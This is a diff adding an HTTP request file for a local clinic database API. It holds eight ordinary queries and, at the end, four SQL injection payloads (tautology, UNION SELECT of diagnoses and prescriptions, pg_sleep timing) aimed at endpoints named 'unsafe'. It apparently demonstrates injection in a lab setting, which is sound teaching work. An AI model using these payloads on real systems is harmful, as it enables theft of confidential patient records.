@@ -1,0 +1,55 @@
+@hostname = localhost:5001
+
+# Query 1
+GET {{hostname}}/last_visit?card_id=1
+
+###
+
+# Query 2
+GET {{hostname}}/current_doctor?card_id=2
+
+###
+
+# Query 3
+GET {{hostname}}/doctor_schedule?doctor_id=1
+
+###
+
+# Query 4
+GET {{hostname}}/current_patients?doctor_id=5
+
+###
+
+# Query 5
+GET {{hostname}}/prescriptions?diagnosis=Migraine
+
+###
+
+# Query 6
+GET {{hostname}}/doctor_in_office?office=106
+
+###
+
+# Query 7
+GET {{hostname}}/visits_amount?card_id=2
+
+###
+
+# Query 8
+GET {{hostname}}/doctors_stats
+
+###
+
+GET {{hostname}}/unsafe_like?name=Peter%25' OR '1'='1' --
+
+###
+
+GET {{hostname}}/unsafe_like?name=0%25' UNION SELECT null, null, d.diagnosis, null, null, d.prescription, null, null from diagnosis d --
+
+###
+
+GET {{hostname}}/unsafe_int?visit_id=-1 OR '1'='1'
+
+###
+
+GET {{hostname}}/unsafe_int?visit_id=-1; SELECT CLOCK_TIMESTAMP() AS start, pg_sleep(2), CLOCK_TIMESTAMP() AS end
